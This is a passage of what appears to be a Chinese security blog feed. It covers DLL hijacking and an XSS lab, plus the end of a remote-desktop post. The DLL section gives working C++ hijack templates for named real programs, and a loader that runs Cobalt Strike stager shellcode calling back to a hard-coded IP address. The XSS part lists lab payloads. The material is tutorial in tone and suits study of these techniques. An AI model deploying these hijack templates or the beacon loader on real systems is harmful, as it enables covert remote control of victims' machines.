src="/2022/06/15/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/image-20240107165927030.png" alt="image-20240107165927030"><br><img src="/2022/06/15/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/image-20240107165936932.png" alt="image-20240107165936932"><br>成功连接</p><p>参考：<a href="https://mp.weixin.qq.com/s/QgCQQMVLGzSIjP-sroiMDw">https://mp.weixin.qq.com/s/QgCQQMVLGzSIjP-sroiMDw</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>3389</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dll劫持</title>
    <link href="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/"/>
    <url>/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<h2 id="dll是什么"><a href="#dll是什么" class="headerlink" title="dll是什么"></a>dll是什么</h2><p>dll为动态链接库文件，又称”应用程序拓展”，是软件文件类型。在Windows中许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库文件，即dll文件，放置于系统中，个人理解类似于我们编程中引入的模块。<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212327100.png" alt="image-20240107212327100"></p><ul><li><p><strong>静态编译</strong>:debug状态下：MTd release状态下：MT</p></li><li><p><strong>动态编译</strong>:debug状态下：MDd release状态下：MD</p><p>  动态编译的生成的可执行文件的exe小，但是运行需要系统环境具有相关的dll和lib文件，就是动态调用系统相关的文件才能运行；</p><p>  静态编译生成的可执行文件exe大，但是运行的时候不依赖于系统环境所依赖的dll和lib等环境问题，在编译的时候已经这些dll相关文件编译进了exe文件，所以exe文件较大。所以需要自己创建的工程需要在别的电脑上运行，考虑到稳定性，同时对执行文件的大小没有要求的话还是尽量选择静态编译。</p></li></ul><h2 id="dll劫持漏洞原理"><a href="#dll劫持漏洞原理" class="headerlink" title="dll劫持漏洞原理"></a>dll劫持漏洞原理</h2><p>如果在一个进程加载dll时没有指定dll的绝对路径，那么windows会尝试去按照顺序搜索这些特定目录来查找这个dll。如果攻击者将恶意的dll放在优先于正常dll所在目录，那么就能够欺骗系统去加载恶意的dll,形成dll劫持。</p><h2 id="DLL路径搜索目录顺序"><a href="#DLL路径搜索目录顺序" class="headerlink" title="DLL路径搜索目录顺序"></a>DLL路径搜索目录顺序</h2><ul><li>程序加载目录</li><li>系统目录。使用GetSystemDirectory获取该路径</li><li>16位系统目录</li><li>windows目录，使用GetWindowsDirectory获取该路径</li><li>windows当前目录</li><li>PATH环境变量中列出的目录</li></ul><h2 id="Know-Dlls注册表项"><a href="#Know-Dlls注册表项" class="headerlink" title="Know Dlls注册表项"></a>Know Dlls注册表项</h2><p>从windows7之后，微软为了更进一步的防御系统的dll劫持，将一些容易被劫持的系统dll写进了一个注册表项中，那么凡是在此项目下的dll文件就会被禁止从exe自身所在目录下调用，而只能从系统目录即system32目录下调用</p><ul><li><strong>默认情况下：</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode<br></code></pre></td></tr></table></figure><p>处于开启状态，如果手动设置为0，关闭该安全选项，搜索顺序为：在以上顺序的基础上，将 当前目录   修改至    系统目录   的位置，其他顺移。</p><p>另外当前应用程序加载dll时如果仅指定dll名称时，那么将按照以上顺序搜索dll文件，不过在加载之前还需要满足以下两条规范：<br>1.当内存中已加载相同模块名称的dll时，系统将直接夹在该dll,不会进行搜索，除非设置了dll重定向选项<br>2.如果要加载的dll模块属于known dlls，系统直接加载系统目录下的该dll，不会进行搜索</p><p>windows操作系统通过”dll路径搜索目录顺序”和“known dlls注册表项”来确定应用程序所要调用的dll的路径，当一个进程尝试加载一个dll的时候，会先尝试搜索程序所处的目录，若还没有找到，则向下搜索16位系统目录即system目录，然后windows目录，当前目录，path环境变量的各个目录。<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212343749.png" alt="image-20240107212343749">这样的加载顺序很容易就会导致一个系统的dll被劫持，只要攻击者将目标文件和恶意dll放在一起即可导致恶意dll搜索顺序优先于系统dll目录加载，就能够欺骗系统去加载恶意的dll，形成”dll劫持”。</p><h2 id="手动劫持"><a href="#手动劫持" class="headerlink" title="手动劫持"></a>手动劫持</h2><ul><li><strong>劫持程序运行时加载的未知dll</strong><br>用到的工具 Process Monitor v3.60<br>通过process monitor监控dll调用是一种最基础的寻找dll劫持的方式<br>设置过滤规则:(默认的不需要改变)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Path ends with .dll<br>Result is NAME NOT FOUND<br>Process Name contains 进程名称<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212400191.png" alt="image-20240107212400191"><br>然后这里找到一个需要用到loadlibrary这个api的dll，这里找有个api的原因是因为如果该dll的调用栈中存在有 **loadlibrary(Ex) * *,说明这个dll被进程所动态加载的。如果这种利用场景下，伪造的dll文件不需要存在任何导出函数即可被成功加载，即使加载后进程内部出错，也是在dll被加载成功加载之后的事情。<br>loadlibrary和loadlibraryex是一个本地加载，一个是远程加载，如果dll不在调用的同一目录下，就可以使用loadlibrary(L”DLL绝对路径”)加载。但是如果DLL内部又调用一个DLL，就需要使用loadlibraryex进行远程加载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">LoadLibraryEx(“DLL绝对路径”, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);<br></code></pre></td></tr></table></figure><p>LoadLibraryEx的最后一个参数设置为load_With_altered_Search_path即可让系统dll搜索顺序从我们设置的目录开始</p><p>找到可以被劫持的dll文件<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212414358.png" alt="image-20240107212414358"><br>编写恶意的dll</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">// dllmain.cpp : 定义 DLL 应用程序的入口点。<br><span class="hljs-comment">#include &quot;pch.h&quot;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><br>BOOL APIENTRY DllMain( HMODULE hModule,<br>                       DWORD  ul_reason_for_call,<br>                       LPVOID lpReserved<br>                     )<br>&#123;<br>    switch (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    system(<span class="hljs-string">&quot;calc&quot;</span>);<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-built_in">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>用vs创建dll项目，并生成<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212428341.png" alt="image-20240107212428341"><br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212439694.png" alt="image-20240107212439694"></p><ul><li><strong>劫持程序某个功能调用的dll文件</strong><br>某个exe程序运行的时候，监控某个功能(例如截图)所调用的dll文件<br>1.使用CFFExplorer工具查看该文件(dll文件名为B)，导出目录里的kerbel32.dll里是否调用了LoadLibrary<br>2.如果调用了LoadLibrary,则在导出目录找导出的函数名(函数名为C)<br>3.自己编写dll，重命名为B.dll，将原先的B.dll重命名为B_origin.dll。B.dll代码里用LoadLibrary调用B_origin.dll<br>4.运行该程序的某个功能，即可劫持</li></ul><p>代码demo<br>extern导出函数的代码可以用rundll32 dllExtern.dll   test(函数名)  调用extern “C” extern “C”使得在C++中使用c编译方式成为可能。在c++下定义c函数，需要加extern “C”关键字。用extern “C”来指明该函数使用c编译方式。输出的”c”函数可以从”c”代码里调用<br>__declspec(dllexport)的作用就是让编译器按照某种预定的方式来输出导出函数及变量的符号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">动态链接库文件中包含若干公用的代码、数据库等。供其他模块使用。动态链接库是将应用程序模块化的重要方法、动态链接库中的函数和数据可以同时供其他多个可执行文件使用，不同的可执行文件可以调用同一个动态链接库中的函数。DLL中函数经过<span class="hljs-string">&quot;导出&quot;</span>后可以被exe文件中的程序调用<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#include &lt;Windows.h&gt; // 这是导出变量的一个示例 </span><br>extern <span class="hljs-string">&quot;C&quot;</span> _declspec(dllexport) void __cdecl <span class="hljs-built_in">test</span>(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine,int nCmdShow) <br>&#123;<br> WinExec(<span class="hljs-string">&quot;calc.exe&quot;</span>, SW_HIDE);<br>  <span class="hljs-built_in">return</span>; <br>  &#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212448823.png" alt="image-20240107212448823"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#劫持dll的代码模板</span><br><span class="hljs-comment">#假设程序加载的dll名字为B，B.dll的导出函数为C</span><br><span class="hljs-comment">#劫持的dll名字改为B</span><br><span class="hljs-comment">#B.dll改为B_Origin.dll</span><br><span class="hljs-comment">#PrScrn改为C</span><br><span class="hljs-comment">#PrScrn_Origial.dll改为B_Origin.dll</span><br><span class="hljs-comment">#include &lt;Windows.h&gt;</span><br>extern <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) void PrScrn();<br>BOOL APIENTRY DllMain( HMODULE hModule,<br>                       DWORD  ul_reason_for_call,<br>                       LPVOID lpReserved<br>                     )<br>&#123;<br>    switch (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        WinExec(<span class="hljs-string">&quot;calc.exe&quot;</span>, SW_HIDE);            //我们要攻击的恶意代码<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-built_in">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">return</span> TRUE;<br>&#125;<br>void <span class="hljs-function"><span class="hljs-title">PrScrn</span></span>()<br>&#123;<br>    MessageBox(NULL, L<span class="hljs-string">&quot;DLL Hijack! by DLLHijacker!&quot;</span>, L<span class="hljs-string">&quot;:)&quot;</span>, 0);  //我们要攻击的恶意代码<br>    HINSTANCE hDllInst = LoadLibrary(L<span class="hljs-string">&quot;PrScrn_Origial.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (hDllInst)<br>    &#123;<br>        typedef DWORD(WINAPI *EXPFUNC)();<br>        EXPFUNC exportFunc = NULL;<br>        exportFunc = (EXPFUNC)GetProcAddress(hDllInst, <span class="hljs-string">&quot;PrScrn&quot;</span>);<br>        <span class="hljs-keyword">if</span> (exportFunc)<br>        &#123;<br>            exportFunc();<br>        &#125;<br>        FreeLibrary(hDllInst);<br>    &#125;<br>    <span class="hljs-built_in">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>实验：<br>process monitor做以下规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Path ends with .dll<br>Result is SUCCESS<br>Process Name contains 进程名称<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212504092.png" alt="image-20240107212504092"><br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212514420.png" alt="image-20240107212514420"><br>使用CFFExplorer查看目标dll文件<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212529408.png" alt="image-20240107212529408"><br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212544173.png" alt="image-20240107212544173"><br>任选一个函数(存在LoadLibraryExW的dll文件的导出目录如果是多个函数，每个函数都可以劫持！)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#include &lt;Windows.h&gt;</span><br><span class="hljs-comment">#include &quot;pch.h&quot;</span><br>extern <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) void beNotified();<br>BOOL APIENTRY DllMain(<br>HMODULE hModule,<br>DWORD ul_reason_for_call,<br>LPVOID lpReserved<br>) &#123;<br>switch (ul_reason_for_call) &#123;<br><span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>WinExec(<span class="hljs-string">&quot;calc.exe&quot;</span>, SW_HIDE); //我们要攻击的恶意代码 <br><span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br><span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br><span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br><span class="hljs-built_in">break</span>;<br>&#125;<br><span class="hljs-built_in">return</span> TRUE;<br>&#125;<br>void <span class="hljs-function"><span class="hljs-title">beNotified</span></span>() &#123;<br>MessageBox(NULL, L<span class="hljs-string">&quot;DLL Hijack! by DLLHijacker!&quot;</span>, L<span class="hljs-string">&quot;:)&quot;</span>, 0); //我们要攻击的恶意代码 <br>HINSTANCE hDllInst = LoadLibrary(L<span class="hljs-string">&quot;NppCoverter_Origial.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (hDllInst) &#123;<br>typedef DWORD(WINAPI *EXPFUNC)();<br>EXPFUNC exportFunc = NULL;<br>exportFunc = (EXPFUNC)GetProcAddress(hDllInst, <span class="hljs-string">&quot;beNotified&quot;</span>);<br><span class="hljs-keyword">if</span> (exportFunc) &#123;<br>exportFunc();<br>&#125;<br>FreeLibrary(hDllInst);<br>&#125;<br><span class="hljs-built_in">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212606693.png" alt="image-20240107212606693"></p><p>将编译好的文件放到目标dll同目录下，并且重命名为NppCoverter.dll。原先的NppCoverter.dll重命名为NppCoverter_Origial.dll</p><p><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212620386.png" alt="image-20240107212620386"><br>执行程序<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212631851.png" alt="image-20240107212631851"></p><h2 id="aheadlib工具劫持"><a href="#aheadlib工具劫持" class="headerlink" title="aheadlib工具劫持"></a>aheadlib工具劫持</h2><p>这里演示程序为极速pdf<br><a href="https://jisupdf.com/">https://jisupdf.com/</a><br>安装好有得到如下文件<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212644495.png" alt="image-20240107212644495"><br>这里先用cobalt strike生成payload<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212653901.png" alt="image-20240107212653901"><br>设置好监听，然后生成<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212702525.png" alt="image-20240107212702525"><br>打开工具aheadlib,然后这里以sqlite3.dll为例<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212713812.png" alt="image-20240107212713812"></p><p>然后就会生成一个cpp文件<br>新建一个dll项目<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212737718.png" alt="image-20240107212737718"></p><p><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212755280.png" alt="image-20240107212755280">将生成的cpp文件覆盖到dllmain.cpp文件中<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212819125.png" alt="image-20240107212819125"><br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212830055.png" alt="image-20240107212830055"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>unsigned char buf[] = <span class="hljs-string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x90\x1f\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x74\x47\x39\x68\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x41\x55\x29\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x35\x33\x2e\x34\x36\x00\x00\x00\x00\x00&quot;</span>;<br>void *<span class="hljs-built_in">exec</span> = VirtualAlloc(0,sizeof(buf),MEM_COMMIT,PAGE_EXECUTE_READWRITE);<br>memcpy(<span class="hljs-built_in">exec</span>,buf,sizeof(buf));<br>CreateThread(0, 0, (LPTHREAD_START_ROUTINE)<span class="hljs-built_in">exec</span>, 0, 0, 0);//创建线程运行shellcode<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212846294.png" alt="image-20240107212846294"><br>然后生成文件<br>将生成的dll文件和原dll文件进行替换<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212857503.png" alt="image-20240107212857503"><br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212907879.png" alt="image-20240107212907879"><br>注意payload的位数要和生产dll文件的位数一致</p><p>参考链接：<a href="https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/">https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>dll劫持</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss靶场练习</title>
    <link href="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>- Pass-1</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/xss/level1.php?name=&lt;script&gt;<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107172935992.png" alt="image-20240107172935992"><br>通过<br><strong>- Pass-2</strong><br>直接插入不行，引号将其包裹起了<br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107172948140.png" alt="image-20240107172948140"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">http:<span class="hljs-comment">//127.0.0.1/xss/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;--</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107172959302.png" alt="image-20240107172959302"><br><strong>- Pass-3</strong><br>审查元素看看<br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173037882.png" alt="image-20240107173037882"><br>看似和2没啥区别 但与level2不同的是，value做了校验，双引号和尖括号都被校验了<br>可以集合单引号和事件来触发</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">‘ onclick=<span class="hljs-string">&#x27;alert(1)</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173047186.png" alt="image-20240107173047186"></p><p><strong>- Pass-4</strong><br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173055574.png" 